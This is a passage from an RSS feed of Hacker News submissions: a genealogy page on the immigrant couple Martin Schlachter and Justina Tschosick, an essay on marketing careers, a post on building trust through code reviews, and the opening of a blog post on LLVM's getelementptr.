        <item>
            <title>
<![CDATA[Martin Schlachter and Justina Tschosick]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24528651">thread link</a>) | @dddddaviddddd
<br/>
September 19, 2020 | https://www.davidschlachter.com/misc/martin-schlachter-justina-tschosick | <a href="https://web.archive.org/web/*/https://www.davidschlachter.com/misc/martin-schlachter-justina-tschosick">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		




<p>My great-grandfather's grandparents, Martin Schlachter and Justina Tschosick, immigrated to Canada from Europe at the beginning of the 20th century. This page collects everything I know about them. I'll keep this updated when I discover something new. If you'd like to share something that I've missed, please <a href="mailto:martinandjustinaschlachter@schlachter.ca">contact me</a>!</p>

<p><a href="#portraits"><img src="https://www.davidschlachter.com/misc/martin-schlachter-portrait-thumb.jpg" alt="Martin Schlachter portrait"></a>
<a href="#portraits"><img src="https://www.davidschlachter.com/misc/martin-schlachter-justina-tschosick-portrait-thumb.jpg" alt="Justina Tschosick portrait"></a></p>

<p>I've organized this page by sources in chronological order. Click any image for the full version.</p>

<p>The one personal anecdote I have about Martin and Justina comes from a brief family history from the collection of Jacquie Doran: "A little tiny house was constructed in the back yard of [their son] Anton's house. Anton's children all had fond memories of their Grandparents living there. Grandma Justina always had candy and Grandpa Martin sat with his legs crossed, smoking his pipe."
</p>

<h4>Table of contents:</h4>

<ul>
	<li><a href="#passport">Russian passport (1890)</a></li>
	<li><a href="#military">Military booklet of Anton Schlachter (1894)</a></li>
	<li><a href="#manifest">Ship manifest for the SS Koln (1902)</a></li>
	<li><a href="#saskhomestead">Saskatchewan homestead application (1903)</a></li>
	<li><a href="#ndhomestead">North Dakota homestead application (1904 – 1910)</a></li>
	<li><a href="#abhomestead">Alberta homestead applications (1910 – 1917)</a></li>
	<li><a href="#census1911">Census of Canada (1911)</a></li>
	<li><a href="#home">Photo beside home (circa 1909 – 1916)</a></li>
	<li><a href="#portraits">Portraits (maybe circa 1909 – 1916?)</a></li>
	<li><a href="#census1916">Census of the Prairie Provinces (1916)</a></li>
	<li><a href="#headstones">Headstones in St. Anthony's Cemetery</a></li>
	<li><a href="#misc">Miscellaneous</a></li>
</ul>


<h2 id="passport">Russian passport (1890)</h2>

<p><a href="https://www.davidschlachter.com/misc/martin-schlachter-passport-01.jpg"><img src="https://www.davidschlachter.com/misc/martin-schlachter-passport-01-thumb.jpg" alt="Martin Schlachter Russian Empire foreign passport, page 1"></a><a href="https://www.davidschlachter.com/misc/martin-schlachter-passport-02.jpg"><img src="https://www.davidschlachter.com/misc/martin-schlachter-passport-02-thumb.jpg" alt="Martin Schlachter Russian Empire foreign passport, page 2"></a></p>

<blockquote>Source: scan (2013) of copy from collection of Jacquie Doran, from the original.</blockquote>

<p>Martin and Justina used this passport when they moved from the Russian Empire to Romania around 1890. The cover is inscribed with Martin's name, and the first page is signed by Martin. The first page indicates that the document has 24 pages (24 страницы) and is an passport (ЗАГРАНИЧНЫЙ ПАССПОРТ, literally Overseas (or Transnational) Passport, often called a <a href="http://www.doukhobor.org/Passports.html">Foreign Passport</a>). The signature block has instructions in Russian, German, and French ("Signature of the bearer").</p>

<p><a href="https://www.davidschlachter.com/misc/martin-schlachter-passport-03.jpg"><img src="https://www.davidschlachter.com/misc/martin-schlachter-passport-03-thumb.jpg" alt="Martin Schlachter Russian Empire foreign passport, page 3"></a><a href="https://www.davidschlachter.com/misc/martin-schlachter-passport-04.jpg"><img src="https://www.davidschlachter.com/misc/martin-schlachter-passport-04-thumb.jpg" alt="Martin Schlachter Russian Empire foreign passport, page 4"></a></p>

<p>The second page is a description of the bearer in Russian:</p>

<blockquote>Предъявитель сего Поселянин Мартын Іосифович Шлахтер с женой Юстиной, детьми: Антоном, Иосифом, Анной, Елизаветой и Розой отправляются за границу, во свидетельство чего и для свободного проезда дан сей паспорт с приложением печати.</blockquote>

<p>The declaration is signed at Odessa, September 18, 1890 (В Одессе, Сентябрь дня 18 1890 года). A stamp is affixed which reads "Gradonachalnik of Odessa, Counter Admiral" (Одесский градоначальник Контр-адмирал) with the signature of the official. (Note that some letters <a href="https://en.wikipedia.org/wiki/Russian_alphabet">look different</a> between the font on this webpage, and the handwriting and italic script used inside the passport.)</p>

<p>The description of the bearer is subsequently repeated, in German (page 4) and then in French (page 5).</p>

<p>My translation from French: "The bearer of the present document, villager Martin Schlachter, goes abroad with his wife Justine and his children: Antoine, Joseph, Anne, Elisabeth and Rose, in faith of which this passport, confirmed by the affixed seal, is given for free passage in foreign countries." Again, the declaration is signed at Odessa, September 18, 1890. Note how "Anton" is written in German, "Antoine" in French.</p>

<p>The Russian text includes one detail that is missing in the French and German translations: in Russian, Martin's name is accompanied by a patronymic, as "Martin son of Joseph" (Іосифович, in latin script: Iosifovich). His full name in cursive in the Russian description reads: Мартын Іосифович Шлахтер; in latin script: Martin Iosifovich Schlachter; <em>i.e.</em> Martin (son of Joseph) Schlachter.</p>

<p><a href="https://www.davidschlachter.com/misc/martin-schlachter-passport-05.jpg"><img src="https://www.davidschlachter.com/misc/martin-schlachter-passport-05-thumb.jpg" alt="Martin Schlachter Russian Empire foreign passport, page 5"></a><a href="https://www.davidschlachter.com/misc/martin-schlachter-passport-08.jpg"><img src="https://www.davidschlachter.com/misc/martin-schlachter-passport-08-thumb.jpg" alt="Martin Schlachter Russian Empire foreign passport, page 8"></a><a href="https://www.davidschlachter.com/misc/martin-schlachter-passport-09.jpg"><img src="https://www.davidschlachter.com/misc/martin-schlachter-passport-09-thumb.jpg" alt="Martin Schlachter Russian Empire foreign passport, page 9"></a></p>

<p>Passport stamps follow, along with a list of family members and other contacts in the USA and Canada. These include their son Anton (Balgonie, Saskatchewan) and their son-in-law John Leibham (Plantersville, Texas, USA, wife of their daughter Agnes).</p>

<p>I'm grateful to reddit users rsotnik and mDeltroy for their help with the Russian text.</p>



<h2 id="military">Military booklet of Anton Schlachter (1894)</h2>

<p><a href="https://www.davidschlachter.com/misc/martin-schlachter-anton-booklet.jpg"><img src="https://www.davidschlachter.com/misc/martin-schlachter-anton-booklet-thumb.jpg" alt="Page from Anton Schlachter's military booklet from 1894"></a><a href="https://www.davidschlachter.com/misc/martin-schlachter-anton-booklet-02.jpg"><img src="https://www.davidschlachter.com/misc/martin-schlachter-anton-booklet-02-thumb.jpg" alt="Page from Anton Schlachter's military booklet from 1894"></a></p>

<blockquote>Source: scan (2013) of copy from collection of Jacquie Doran.</blockquote>

<p>Martin and Justina's son Anton entered the Romanian military in January 1894, serving until some point before his departure from Europe in 1905. His service was recorded in a small booklet which begins with his biographical details. The booklet lists his parents as Anton (a mystery since this name does not appear to be used elsewhere by Martin) and Justina, apparently residing in Chirage.</p>



<h2 id="manifest">Ship manifest for the SS Koln (1902)</h2>

<p><a href="https://www.davidschlachter.com/misc/martin-schlachter-koln-manifest-1902.jpg"><img src="https://www.davidschlachter.com/misc/martin-schlachter-koln-manifest-1902-thumb.jpg" alt="Page from the passenger list of the SS Koln showing Martin Schlachter and Justina Tschosick, Dec 18, 1902"></a></p>

<blockquote>Source: Selected Passenger and Crew Lists and Manifests. National Archives, Washington, D.C., via Ancestry.com. This source was brought to my attention by <a href="https://schlachter.ca/familyweb/martin.html">Alan Schlachter</a>.</blockquote>

<p>Martin and Justina immigrated to the Americas aboard the SS Koln, a ship operated by the Norddeutscher Lloyd Steamship Company. They left Bremen in the northern German Empire (probably the port of Bremen, 50 km downstream of the city itself), arriving in Galveston, Texas, USA on December 12, 1902.</p>

<p>Martin declares himself to be 55 years old, a farmer, able to read and write. He is declared as a Romanian national, with his last residence at Constanța, Romania (roughly 2000 km from Bremen!), and he indicates that he intends to join his son in Plantersville, Texas. Justina is declared as age 50, unable to read or write. The family was travelling with their youngest daughters, Elizabeth (17) and Rosa (15). The manifest notes that Martin was carrying more than $30 (roughly $1000 USD in 2020) and had paid the fare for the family.</p>

<p>The ship, the SS Koln, was built in 1899, and was the <a href="https://www.theshipslist.com/ships/lines/nglloyd.shtml">second second ship of this name</a> operated by Norddeutscher Lloyd. The ship is <a href="http://web.archive.org/web/20080616161131/http://www.fortunecity.com/littleitaly/amalfi/13/shipik.htm">described as follows</a>:</p>

<blockquote>
	The "Koln" of 1899 was a 7409 gross ton vessel built in 1899 by J.C.Tecklenborg of Geestemunde for Norddeutscher Lloyd. Her details were - length 428.9ft x beam 54.3ft, one funnel [smoke-stack], two masts, twin screw and a speed of 13 knots [25 km/h]. There was accommodation for 120 [second]- and 1,850 [third]-class passengers. Launched on 24/7/1899, she sailed from Bremen on her maiden voyage to Galveston on 20/10/1899. On 21/12/1899 she commenced her first voyage from Bremen to Baltimore, and on 4/1/1902 her first run from Bremen to New York. Subsequently she ran from [B]remen to Baltimore or Galveston, occasionally to or via New York.<br>
	— Posted to the Emigration-Ships Mailing List by Ted Finch - 2 October 1997 (see also <a href="https://www.theshipslist.com/ships/descriptions/ShipsK.shtml">quote from North Atlantic Seaway</a>)
</blockquote>



<h2 id="saskhomestead">Saskatchewan homestead application (1903)</h2>

<!-- I've requested a copy of the actual application from the Saskatchewan provincial archives, 2020-09-18 -->

<p><a href="https://www.davidschlachter.com/misc/martin-schlachter-sask-homestead-01.jpg"><img src="https://www.davidschlachter.com/misc/martin-schlachter-sask-homestead-01-thumb.jpg" alt="Saskatchewan homestead grant register for Martin Schlachter"></a></p>

<blockquote>Source: Manitoba, Saskatchewan and Alberta, Canada, Homestead Grant Registers, 1872-1930 from Ancestry.com.</blockquote>

<p>Beginning with the <em>Dominion Lands Act</em> of 1872, the Canadian government <a href="https://www.bac-lac.gc.ca/eng/discover/land/land-grants-western-canada-1870-1930/Pages/land-grants-western-canada.aspx">offered land ownership</a> in Western Canada to those willing to settle and cultivate it. Martin and Justina formally began the application process in Saskatchewan in October of 1903. While I haven't found their actual application<!--(I've requested any relevant records from the Saskatchewan Provincial Archives)-->, this register shows that their application was received. Their original application number was 149474.</p>

<p>The plot of land was the South-West quarter-section of Section 34 in Township 1, Range 12 West of the 2nd meridian, near modern-day Torquay, SK, centred around <a href="http://www.bing.com/maps/default.aspx?cp=49.079460~-103.531347&amp;sp=Polyline.49.072172_-103.520310_49.086649_-103.520343_49.086647_-103.542302_49.072371_-103.542433_49.072172_-103.520310_34-1-12-W2_Saskatchewan_http://legallandconverter.com__%2300ff00__4px_Single_Solid&amp;lvl=13&amp;v=2&amp;sV=2&amp;style=a">49.079460, -103.531347</a> (<a href="https://goo.gl/maps/BKmR1ReFXRhfVEY77">alternate link</a>).</p>

<p>According to their next homestead application, they abandoned this plot, applying next in Alberta. They must have left the land before 1906, by which point homesteader Johanne Kroche is recorded as living there in the 1906 Census and in a homesteading file. As well, when Anton Schlachter left Bremen for America in November 1905, the passenger manifest shows that he declared his intention to join his father, Martin, in Berwick, North Dakota.</p>



<h2 id="ndhomestead">North Dakota homestead application (1904 – 1910)</h2>

<!-- Homesteading in the US also required naturalization. I've requested a copy of Martin's naturalization records from the ND Archives, 2020-09-19 -->

<!-- Homesteading records are available from the National Archives for a $50 fee. However, they are not currently processessing document requests due to the pandemic -->

<p><a href="https://www.davidschlachter.com/misc/martin-schlachter-nd-land-tract.jpg"><img src="https://www.davidschlachter.com/misc/martin-schlachter-nd-land-tract-thumb.jpg" alt="Bureau of Land Management Tract Book entry for Martin Schlachter"></a>
</p>

<blockquote>Source: United States Bureau of Land Management Tract Books, Dakota Territory, Vol 74, page 231, via FamilySearch.org.</blockquote>

<p>After leaving Saskatchewan, Martin and Justina made a homestead application in North Dakota. Martin appears in the land tract register as Martin Schlagter, application date ('date of sale') April 15, 1904, for a homestead ("Hd."). He paid $5, presumably part of the application fee. According to the register, he was granted title to the land (a 'land patent') on September 4, 1909. This was recorded through land patent number 122219, issued March 31, 1910.</p>

<p><a href="https://www.davidschlachter.com/misc/martin-schlachter-nd-patent.jpg"><img src="https://www.davidschlachter.com/misc/martin-schlachter-nd-patent-thumb.jpg" alt="North Dakota land patent for Martin Schlachter"></a>
</p>

<blockquote>Source: United States Bureau of Land Management Land Patents database, BLM serial number NDDL 0002356, accessed through glorecords.blm.gov.</blockquote>

<p>The actual land patent shows the grant of Lot 4 of Section 3, Township 152 North of Range 74 West of the Fifth Principal Meridian, North Dakota, to Martin Schlachter. The Section is centred roughly on <a href="https://goo.gl/maps/eMV8Ejtxrr3VXmGLA">48.01399, -99.99462</a>, in modern-day Pierce County, North Dakota. The patent is dated March 31, 1910.</p>

<p>It is possible that this lot was sold, since Martin and Justina left North Dakota shortly after obtaining the land patent. Their next destination was Alberta, departing North Dakota sometime before April 1910.</p>

<!--<p>(Note: their son Joseph's nearby homestead plot is in Volume 79, p. 167, 'purchase date' date May 16, 1908, patent date Nov 13, 1908, actual patent dated Oct 14, 1909, see https://www.familysearch.org/ark:/61903/3:1:3QS7-L9WS-ZNLK?i=166&wc=M7W7-S6K%3A356164401%2C356169401&cc=2074276)</p>-->


<h2 id="abhomestead">Alberta homestead applications (1910 – 1917)</h2>

<p><a href="https://www.davidschlachter.com/misc/martin-schlachter-homestead-application-01.jpg"><img src="https://www.davidschlachter.com/misc/martin-schlachter-homestead-application-01-thumb.jpg" alt="Homestead application for Martin Schlachter, first page"></a>
<a href="https://www.davidschlachter.com/misc/martin-schlachter-homestead-application-02.jpg"><img src="https://www.davidschlachter.com/misc/martin-schlachter-homestead-application-02-thumb.jpg" alt="Homestead application for Martin Schlachter, second page"></a></p>

<blockquote>Source: Alberta Homestead Records 1870-1940 at Archive.org and Ancestry.com, via the <a href="https://www.abgenealogy.ca/alberta-homestead-index">Alberta Homestead Index</a>.</blockquote>

<p>The first form to <a href="http://archaeologyblog.treetimeservices.ca/2017/08/14/the-alberta-homestead-process/">start the homesteading process</a> was an <em>Application for entry</em>. At the time that Martin applied in Alberta in April of 1910, <a href="https://www.saskarchives.com/collections/land-records/history-and-background-administration-land-saskatchewan/homesteading">the eligibility requirements</a> were as follows:
</p>

<ul>
	<li>Male over 18 years old, or female sole head of family</li>
	<li>Intention to become a British subject (if not already)</li>
</ul>

<p>In order to gain the title for the land, a plot of 160 acres often called a homestead, Martin <a href="https://www.saskarchives.com/collections/land-records/history-and-background-administration-land-saskatchewan/homesteading">would need to</a>:
</p>

<ul>
	<li>Cultivate the land for three years</li>
	<li>Commence cultivation within six months of arrival</li>
	<li>Crop (harvest) at least 5 acres in the first year, and 15 in the second</li>
	<li>Build a 'habitable house' before the end of the second year, and reside in it from the beginning of the third year</li>
	<li>Reside within a distance of nine miles of the homestead</li>
	<li>Finish the naturalization process to become a British subject</li>
</ul>

<p>In his application for entry, Martin declares that he is 69 years old and a Russian subject, born in southern Russia, and the he intends to settle the homestead with his wife (age 64) and (presumably) a son aged 37 (Anton, born …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.davidschlachter.com/misc/martin-schlachter-justina-tschosick">https://www.davidschlachter.com/misc/martin-schlachter-justina-tschosick</a></em></p>]]>
            </description>
            <link>https://www.davidschlachter.com/misc/martin-schlachter-justina-tschosick</link>
            <guid isPermaLink="false">hacker-news-small-sites-24528651</guid>
            <pubDate>Sat, 19 Sep 2020 16:39:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Think About Your Marketing Career]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24528290">thread link</a>) | @krackpipio
<br/>
September 19, 2020 | https://kracov.co/writing/how-to-think-about-your-marketing-career | <a href="https://web.archive.org/web/*/https://kracov.co/writing/how-to-think-about-your-marketing-career">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In this post, I provide a framework for how to think about building a marketing career.</p><h2><strong>Career North star: Ikigai</strong>&nbsp;</h2><p>Before talking about marketing specifically, it's important to take a step back and look at what a successful career means. The Japanese have a wonderful concept called Ikigai that provides a&nbsp; framework for how to approach your career and life. Ikigai is a concept that translates to “A Reason for Being” and is typically explained through a venn diagram.</p><p>‍</p><figure id="w-node-a3d6c5d9ff99-32481ab0"><p><img src="https://assets-global.website-files.com/5ea5d85d88b3bd7015481ab4/5f65173608a72e8df53b2d20_5b983488b34ddc1d0ab4c69b_1524071183-ikigai.png" loading="lazy" alt=""></p></figure><p>‍<br></p><p>As you think about your career, you should be asking yourself the four Ikigai questions:</p><p>What do I love?</p><p>What am I good at?</p><p>What does the world need?&nbsp;</p><p>What can I get paid to do?&nbsp;</p><p>The intersection of the answers to these four questions is Ikgai. This intersection should be the north star that everyone follows throughout their career. Keep this in the back of your mind as you think about your place in marketing.</p><h2><strong>Framework for Marketing Careers</strong></h2><p>There’s a lot of reasons why people decide to work in marketing. Maybe you always liked ads, or took a marketing course in college&nbsp; or maybe you&nbsp; sort of fell into it (like me). Whatever your reasoning. Welcome! I’m glad you’re here.&nbsp;</p><p>Marketing is a fun job. You get to be creative. You get to work with technology. You get to always be on the bleeding edge. And if you stick around long enough, you’ll get to work on a variety of different subject matters and industries.&nbsp;</p><p>There’s a wide range of disciplines within marketing. This dynamic makes approaching a marketing career a complex puzzle. The general framework I use to think about this decision comes down to four elements:</p><p><strong>Function</strong>: the type of marketing you do (communications, creative, product, demand, etc.)</p><p><strong>Industry: </strong>the market you focus on (software, ecommerce, non-profit, cpg, etc.)</p><p><strong>In or Out: </strong>whether you work on the brand side (in-house) or work at a a service business (agency)</p><p><strong>Company Size: </strong>how big of a company you want to work for&nbsp;</p><p>Throughout your career, you’ll likely bounce back and forth between different roles across these elements. I’ve found that the only way to really understand what you prefer is by trying something for a period of time. It’s going to be an iterative process to figure out what you want to do.</p><p>Here’s how I would think about each of these elements:</p><h3><strong>Function</strong></h3><p>Marketing has a wide range of functions to choose from.</p><figure id="w-node-47ec6285e7e0-32481ab0"><p><img src="https://assets-global.website-files.com/5ea5d85d88b3bd7015481ab4/5f6522b720f36def48b04827_Marketing%20program%20snapshot.jpg" loading="lazy" alt=""></p></figure><p>To determine your function, you should ask yourself two different questions:</p><p><strong>What am I good at?</strong> Think about the skills you’re bringing to the table and think about how those skills match to the job. For example, if you’re good at writing, perhaps communications, copywriting or content marketing is the right choice for you.</p><p><strong>What do you want to learn? </strong>Ask yourself what you’re interested in learning more about or what elements of marketing intrigue you. For example, maybe growing up you were obsessed with commercials and viral brand videos,. Then you should consider getting a job in video production and creative direction.</p><p>It can be challenging to answer these questions, especially when you’re early in your career. You likely don’t know enough about the nuances of each function to understand where you best fit. You might not even know what you want to learn.</p><p>As a result, I would tell anyone looking for entry-level jobs to get a junior marketing role. This will help you get your foot in the door, but also allow you to get a sense of what functions within marketing you enjoy and which functions you hate.</p><p>I also recommend that you should constantly be learning by osmosis and observing the people around you to figure out what you might enjoy.</p><p>As you advance in your career, the function and expertise of choice will become more clear. You’ll start to develop a set of skills that will come to define your functional area.</p><h3><strong>Industry</strong>&nbsp;</h3><p>The next element to consider is what industry you want to work in. Marketing exists in every industry and looks different depending on what industry you choose. Marketing for a consumer product looks different then marketing for a software company.</p><p>To determine what industry you want to work in, you should put a mirror up to yourself and consider what you are interested in. What do you enjoy talking about? What do you spend your free time doing? What are you a nerd about?&nbsp;</p><p>The best marketers know the ins and outs of their industry and can&nbsp; understand their audience. You’ll have a leg up if you are your own audience. If you spend your free time learning/engaging with a specific industry, then you’ll be more successful in marketing to that industry. For example, if you’re a gaming nerd then you’ll know how to market to other gaming nerds, since you are one. You’ll be able to take your innate knowledge and apply that to your marketing work.</p><p>The other way to look at the Industry decision is through the lens of emerging trends. What categories are increasing? You want to be in a growing industry, so that you can grow your career with the category and become an expert.</p><p>For me, the answer to both of these questions was technology, software companies and startups. In college, I became obsessed with entrepreneurship and Silicon Valley. I wanted to learn how to build companies that make money online, so I focused my career on that theme.</p><h3><strong>In-house or Out (agency/freelancer)</strong></h3><p>The last decision you should consider is whether you want to work in-house at a company or work in a marketing service role (i.e.&nbsp; agency or freelancer). It’s common for marketers to switch back and forth between agency and in-house depending on personal preference and career stage. I started my career at an agency and then moved in-house. I enjoyed both for different reasons.</p><h4><strong>Agencies</strong></h4><p>Agencies can be a great place to sharpen your marketing skills and get exposed to a wide range of problems. Agencies have a wide range of different setups and specialize in different things. Some focus on digital marketing others make commercials. You need to pick an agency that matches your interest.</p><p>Agencies are also traditionally split between Accounts and Creative teams. The accounts team acts as a project manager and manages the client relationship. When working on the Accounts team, you get valuable project management skills. You also tend to develop a more generalist skill set and learn how to run a team. I’m biased, but I think working on an Accounts team sets you up well to run a marketing team in the future (that’s what happened to me).&nbsp;</p><p>When you’re on the Creative side, you get to specialize in your selected craft. This can range across the different functions that we discussed above. This usually depends on the agency's speciality.</p><p>Generally speaking, the benefit of working at an agency is that you get to work across a variety of different accounts. When I worked at the agency, I worked on projects for Google, California Hospital Association, Green Bay Packers and the Vietnam Veterans Memorial Fund. I experienced a wide range of challenges that gave me a valuable breadth of experience. One day I was running a digital fundraising campaign and the next I was supporting the launch of a Google product.</p><p>There’s also some downsides to agencies. The first is that you’re constantly at the mercy of the clients. It can feel like you’re playing a game to make clients happy, rather than to do the best work for the brand. There’s also a feeling that you don’t get to take things to the finish line or own a project from end to end. Oftentimes, agencies are focusing on just one part of a campaign (ex. video in a broader product launch), but the rest of the campaign is left to internal teams or other agencies. For me, this dynamic made projects less rewarding, and at times, frustrating.&nbsp; I felt like the clients messed up our vision for whatever we were working on.</p><h4><strong>In-house</strong></h4><p>When you work in-house, the main benefit is ownership.&nbsp; You get to feel like you’re building something and owning projects from start to finish. There’s a sense of ownership and accomplishment that’s hard to get at an agency. I’m way prouder of my work building Lattice, than any of my agency work.</p><p>You become intimately familiar with the company’s brand/strategy. You get the chance to go deep and understand all the nuances of the market. You get to build a marketing strategy that captures the market's attention.&nbsp;</p><p>For me, the most rewarding part of working in-house is the ability to architect plans and watch them come to life. You get to be the strategist and the executor. You get to be the person who manages budgets, runs campaigns and hires agencies. It’s fun turning concepts into reality, and then seeing your impact on the business.</p><p>There’s also greater accountability to impact the companies goals. You have real metrics and goals that you need to hit. When you actually achieve these goals it's rewarding. (Of course, agencies have goals, but I found this dynamic to be different. Your goal is making the client happy, not the business's goal). For some people, this level of accountability and the idea of “owning a number” can be daunting. But for others, this level of ownership is inspiring and rewarding.</p><p>In-house marketers also get exposed to how (non-service) companies operate, especially cross-functional relationships. When you’re in this role, you’re able to see how Sales, Product, Customer Success, Finance, Operations and HR all interact with Marketing. You get to feel the tension between marketing and sales around leads. You experience product roadmapping and get to launch products. You work with finance to set up budgets and partner with HR to solve people challenges.</p><p>When compared to agencies, the main downside of in-house is the limited exposure to different problems and industries. It can be boring/annoying to work on the same brand year after year. You’re constantly dealing with the same challenges and it can also feel like you’re not learning anymore, which is never a good thing.</p><p>In the end, there’s no wrong answer. Working at an agency or in-house both have their pros and cons, and are the right fit for different people, at …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kracov.co/writing/how-to-think-about-your-marketing-career">https://kracov.co/writing/how-to-think-about-your-marketing-career</a></em></p>]]>
            </description>
            <link>https://kracov.co/writing/how-to-think-about-your-marketing-career</link>
            <guid isPermaLink="false">hacker-news-small-sites-24528290</guid>
            <pubDate>Sat, 19 Sep 2020 15:54:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Build Team Trust with Code Reviews]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24528172">thread link</a>) | @mpgarate
<br/>
September 19, 2020 | https://mpgarate.com/2020/05/27/building-trust-with-code-reviews.html | <a href="https://web.archive.org/web/*/https://mpgarate.com/2020/05/27/building-trust-with-code-reviews.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

      
      
<p>I’m a <strong>Senior Software Engineer</strong> at <strong>LinkedIn</strong> building <strong>Production Infrastructure</strong>. Previously, I was at <strong>Etsy</strong> leading the <strong>Machine Learning Infrastructure</strong> team.</p>


      
<p><em>May 2020</em></p><p>As developers, we can treat code review as an opportunity to build trust. There is something vulnerable about asking for feedback, and by responding with collaboration rather than confrontation, we build psychological safety. Imagine a world where you look forward to getting a review because the feedback makes the code better, shows respect for your work, and makes you glad you work with the people around you. We can choose to live in that world.</p>

<h3 id="show-gratitude">Show gratitude</h3>

<p><strong>Consider saying “thanks for putting this together!” or “thanks for reviewing this!”</strong> The reviewer and author both went to work in good faith to make an improvement to the software. No matter what feedback we might have, we should show appreciation for the effort spent on it.</p>

<p>There is a <a href="https://en.wikipedia.org/wiki/Gratitude#Empirical_findings">body of research</a> (outside my area of expertise) that links gratitude to happiness, stress reduction, relationship satisfaction, and personal growth. When we review a piece of code, in addition to showing gratitude, we can take a few seconds to <strong>actually believe it</strong>. Isn’t it great that someone took the time to improve this software?</p>

<h3 id="language-matters">Language matters</h3>

<p>Text on code reviews lacks the expressiveness of other mediums that can help show good faith (i.e. smiling, voice tone, real time responsiveness). With this in mind, we can <strong>over</strong>compensate to make up for the limitations of text.</p>

<p><strong>Consider using “we” instead of “you”</strong>. When one developer writes code and submits it to the team for review, they may be tempted to have a “me vs them” mentality: my code is ready and good, and they just need to give approval. A comment framed as “we” shows that the reviewer and author are aligned in an effort to improve the code and release it promptly. A comment framed as “you” can come across as combative and blameful, even though that is not the intent. The “we” mentality goes beyond language. Code changes are owned by the team as a whole, and except in an emergency, no one individual should release something without the support of teammates. Effective teams succeed and fail as a group.</p>

<p><strong>Consider saying “I think.”</strong> Using the phrase “I think” shows the reader that you acknowledge your own limitations and are open to hearing their input as well. Guides for academic writing and presentations suggest avoiding the phrase “I think” in order to sound more assertive. Code reviews, on the other hand, benefit from collaboration, where increased information flow from multiple sources leads to a better result. Underrepresented people in tech sometimes hear advice to sound more assertive at work, and this places responsibility in the wrong place. Strong communicators know how to listen well and identify good ideas from anyone on the team, regardless of background, seniority, or role.</p>

<h3 id="review-to-release">Review to release</h3>

<p><strong>Consider saying “It’s ok to address this comment in a later change.”</strong> Code authors and managers want code to ship ASAP. Time spent rewriting code after code review is time where the user benefit is not in production and where the author could be working on a new task. Code reviewers can support this interest by distinguishing between changes that should be addressed before or after release. For example, it might be a good idea to refactor a long function, but if that is the only thing blocking release, then the team could agree to release the user benefit, refactor, and release again. This also leads to smaller changesets, which allows for faster feedback cycles.</p>

<h3 id="trivial-changes">Trivial changes</h3>

<p><strong>Consider applying the trivial suggestions.</strong> Choosing not to battle a nitpick can be a cheap way to build team ownership of a shared codebase. Reviewers should ideally keep comments about minor syntax changes to a minimum to prioritize discussion on impactful issues. If there is a pattern of too many nitpicks, that can be discussed in a team meeting. Still, nitpicks will inevitably come up, and while it can be tempting to push back against these, that also takes time away from bigger issues and releasing the user benefit. When implementing a nitpick is trivial and not harmful to the codebase, doing so tells your teammate that you value their input and increases their sense of ownership of the code. This helps people internalize the reality that once released, the code is owned by the team and no individual.</p>


<hr>


      
      
<ul>
  <li><a href="mailto:michael@garate.email">michael@garate.email</a></li>
  <li><a href="http://linkedin.com/in/mpgarate/">LinkedIn</a></li>
  <li><a href="https://github.com/mpgarate">GitHub</a></li>
  <li><a href="https://docs.google.com/document/d/1MXwxtcTSsGAPKCYOreMZ3lpVVDFdWO_2-o7R80zpNzc/edit?usp=sharing">Resume</a></li>
</ul>

    </div></div>]]>
            </description>
            <link>https://mpgarate.com/2020/05/27/building-trust-with-code-reviews.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24528172</guid>
            <pubDate>Sat, 19 Sep 2020 15:41:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[LLVM's Getelementptr, by Example]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24528033">thread link</a>) | @woodruffw
<br/>
September 19, 2020 | https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example | <a href="https://web.archive.org/web/*/https://blog.yossarian.net/2020/09/19/LLVMs-getelementptr-by-example">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">


<h2><em>Programming, philosophy, pedaling.</em></h2>

<ul>
    <li><a href="https://blog.yossarian.net/">Home</a></li>
    <li><a href="https://blog.yossarian.net/tags">Tags</a></li>
    <li><a href="https://blog.yossarian.net/favorites">Favorites</a></li>
    <li><a href="https://blog.yossarian.net/archive">Archive</a></li>
    
      <li><a href="https://yossarian.net/">Main Site</a></li>
    
</ul>

<hr>



<h2>
  <em>Sep 19, 2020</em>
</h2>

  <p>Tags:
  
    
    <a href="https://blog.yossarian.net/tags#programming">programming</a>,
    
  
    
    <a href="https://blog.yossarian.net/tags#devblog">devblog</a>,
    
  
    
    <a href="https://blog.yossarian.net/tags#llvm">llvm</a>
    
  
  </p>


<p><img src="https://blog.yossarian.net/assets/one-fear-gep.png" alt="">
<em>(With apologies to <a href="https://www.branson-reese.com/">Branson Reese</a>.)</em></p>

<h2 id="preword">Preword</h2>

<p>I’ve been working inside of codebases built on LLVM for a little over two years. I’m used
to (and very comfortable) reading LLVM IR.</p>

<p>Despite all that, I <em>still</em> need to stop and think about <code>getelementptr</code>’s semantics whenever I see
it. Thus: this post will serve to help myself (and maybe you, reader) feel more comfortable with
<code>getelementptr</code>.</p>

<h2 id="background">Background</h2>

<p>First of all, there’s this thing called <a href="https://llvm.org/">LLVM</a>.</p>

<p>LLVM originally stood Low Level Virtual Machine, but
<a href="https://lists.llvm.org/pipermail/llvm-dev/2011-December/046445.html">no longer stands for anything</a>.</p>

<p>The LLVM Project has many parts, but is perhaps best known by ordinary developers
for being the home of Clang, an optimizing C/C++ compiler<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>.</p>

<p>Beyond being an impressive piece of compiler engineering, LLVM’s greatest claim to fame is
